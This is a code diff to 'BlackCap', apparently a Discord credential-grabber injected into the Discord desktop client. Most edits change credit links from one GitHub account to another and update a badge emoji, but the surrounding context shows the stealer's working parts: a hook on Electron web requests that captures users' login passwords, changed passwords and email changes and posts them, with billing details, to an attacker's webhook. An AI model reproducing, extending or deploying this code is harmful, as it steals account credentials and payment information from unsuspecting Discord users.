@@ -69,7 +69,7 @@ const makeEmbed = async ({
                 name: "BlackCap"
             },
             footer: {
-                text: "©KSCH | https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook"
+                text: "©KSCH | https://github.com/KSCHdsc"
             },
 
         }]
@@ -111,11 +111,11 @@ const getGifOrPNG = async (url) => {
 
 const GetBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
 }
 const GetRBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
 }
 
 const GetNSFW = (bouki) => {
@@ -230,7 +230,6 @@ function GetLangue(read) {
 }
 const post = async (params) => {
     params = JSON.stringify(params)
-    
     [config.webhook].forEach(res => {
         const url = new URL(res);
         const options = {
@@ -315,7 +314,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook/BlackCap-Grabber)`,
+                value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                 inline: !0
             }, {
                 name: "Billing <a:billing:1041641103629234196>",
@@ -407,7 +406,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook/BlackCap-Grabber)`,
+                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -542,7 +541,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var password = data.password
             var params = await makeEmbed({
                 title: "BlackCap User Login",
-                description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook)",
+                description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                 color: config['embed-color'],
                 fields: [{
                     name: "Injection Info",
@@ -578,7 +577,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook/BlackCap-Grabber)`,
+                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -623,7 +622,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (data.new_password) {
                 var params = await makeEmbed({
                     title: "BlackCap Detect Password Changed",
-                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook)",
+                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -659,7 +658,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook/BlackCap-Grabber)`,
+                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -710,7 +709,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (data.email) {
                 var params = await makeEmbed({
                     title: "BlackCap Detect Email Changed",
-                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook)",
+                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -746,7 +745,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook/BlackCap-Grabber)`,
+                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
